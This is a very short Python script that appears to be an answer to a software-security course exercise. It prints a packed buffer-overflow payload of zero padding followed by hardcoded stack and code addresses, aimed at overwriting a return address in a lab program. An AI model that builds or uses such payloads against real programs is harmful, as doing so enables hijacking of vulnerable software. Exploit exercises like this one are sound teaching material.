#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(pack("<IIIII", 0x0, 0x0, 0x0, 0xfffe8db8, 0x080488c5))
